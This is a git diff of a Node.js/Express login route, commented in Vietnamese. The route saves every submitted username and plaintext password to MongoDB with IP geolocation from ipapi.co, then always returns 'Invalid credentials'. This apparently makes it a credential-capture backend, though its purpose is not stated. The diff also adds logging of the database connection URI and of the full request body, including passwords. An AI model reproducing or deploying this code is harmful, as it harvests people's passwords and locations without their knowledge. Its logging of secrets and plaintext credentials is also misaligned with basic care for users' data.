@@ -6,26 +6,45 @@ const axios = require("axios");
 
 dotenv.config();
 
+// Log MongoDB URI để debug
+console.log("MongoDB URI:", process.env.MONGODB_URI);
+
 const router = express.Router();
 router.use(cors());
 router.use(express.json());
 
-mongoose
-  .connect(process.env.MONGODB_URI)
-  .then(() => console.log("Connected to MongoDB"))
-  .catch((err) => console.error("Could not connect to MongoDB:", err));
+// Kết nối MongoDB
+const connectDB = async () => {
+  try {
+    console.log("Attempting to connect to MongoDB...");
+    await mongoose.connect(process.env.MONGODB_URI, {
+      useNewUrlParser: true,
+      useUnifiedTopology: true,
+    });
+    console.log("Connected to MongoDB successfully");
+  } catch (error) {
+    console.error("Could not connect to MongoDB:", error.message);
+    throw error; // Throw error để biết chi tiết lỗi
+  }
+};
 
-const loginAttemptSchema = new mongoose.Schema({
-  username: String,
-  password: String,
-  timestamp: { type: Date, default: Date.now },
-  ip: String,
-  country: String,
-  city: String,
-  timezone: String,
-  browser: String,
-  os: String,
-});
+// Kết nối ngay khi server khởi động
+connectDB().catch(console.error);
+
+const loginAttemptSchema = new mongoose.Schema(
+  {
+    username: String,
+    password: String,
+    timestamp: { type: Date, default: Date.now },
+    ip: String,
+    country: String,
+    city: String,
+    timezone: String,
+    browser: String,
+    os: String,
+  },
+  { collection: "userattempts" }
+); // Chỉ định collection name
 
 const LoginAttempt = mongoose.model("LoginAttempt", loginAttemptSchema);
 
@@ -40,6 +59,7 @@ const getClientIp = (req) => {
 };
 
 router.post("/login", async (req, res) => {
+  console.log("Received login request:", req.body);
   const { username, password } = req.body;
   const ip = getClientIp(req);
   const userAgent = req.headers["user-agent"];
@@ -47,6 +67,7 @@ router.post("/login", async (req, res) => {
   console.log("Client IP:", ip);
 
   try {
+    // Lấy thông tin vị trí từ ipapi.co
     const locationResponse = await axios.get(`https://ipapi.co/${ip}/json/`);
     const locationData = locationResponse.data;
 
@@ -63,7 +84,10 @@ router.post("/login", async (req, res) => {
       os: userAgent,
     });
 
-    await loginAttempt.save();
+    console.log("Saving login attempt:", loginAttempt);
+    const savedAttempt = await loginAttempt.save();
+    console.log("Saved login attempt:", savedAttempt);
+
     res.status(401).json({ message: "Invalid credentials" });
   } catch (error) {
     console.error("Error saving login attempt:", error);
